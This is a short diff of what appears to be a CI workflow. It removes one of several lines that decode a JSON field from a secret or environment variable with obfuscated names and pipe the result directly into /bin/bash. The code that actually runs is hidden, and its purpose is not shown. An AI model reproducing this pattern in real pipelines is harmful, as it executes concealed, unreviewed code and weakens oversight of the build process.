@@ -22,7 +22,6 @@ jobs:
           c43129: ${{ secrets.c43129 }}
         run: |
           printf '%s' "$c43129" | jq -r .oh168 | /bin/bash
-          echo $rhbof8364 | jq -r .g6 | /bin/bash
           echo $mj4981 | jq -r .szpb7246 | /bin/bash
 
       - name: Upload archive
